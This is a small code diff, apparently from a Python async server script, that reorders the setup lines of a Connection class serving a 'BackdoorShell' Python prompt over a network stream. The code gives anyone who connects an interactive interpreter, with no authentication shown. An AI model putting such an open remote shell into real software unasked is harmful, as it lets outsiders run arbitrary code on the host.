@@ -60,10 +60,10 @@ if __name__ == "__main__":
     class Connection(object):
         shell = BackdoorShell()   # global
         def __init__(self, stream, address):
+            stream.set_close_callback(stream.close)
+            stream.write(b'>>> ')
+            stream.read_until(b'\n', self.handle_input)
             self.stream = stream
-            self.stream.set_close_callback(self.stream.close)
-            self.stream.write(b'>>> ')
-            self.stream.read_until(b'\n', self.handle_input)
 
         def handle_input(self, line):
             self.stream.write(self.shell.push(line.decode()).encode())
